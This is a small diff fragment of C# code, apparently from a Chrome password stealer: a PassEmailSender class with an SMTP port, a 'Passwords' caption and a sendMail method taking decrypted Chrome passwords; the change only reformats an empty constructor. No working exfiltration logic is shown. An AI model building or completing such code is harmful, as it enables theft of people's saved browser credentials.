@@ -14,10 +14,9 @@ namespace dpapiPass
         public const string CAPTION = "Passwords";
         public const string MESSAGE = "This is attach with passwords...";
         public const int PORT = 587;
-        public PassEmailSender()
-        {
 
-        }
+        public PassEmailSender(){}
+
         public void sendMail(ChromePasswordDecrypt chromePasswordDecrypt)
         {
             try
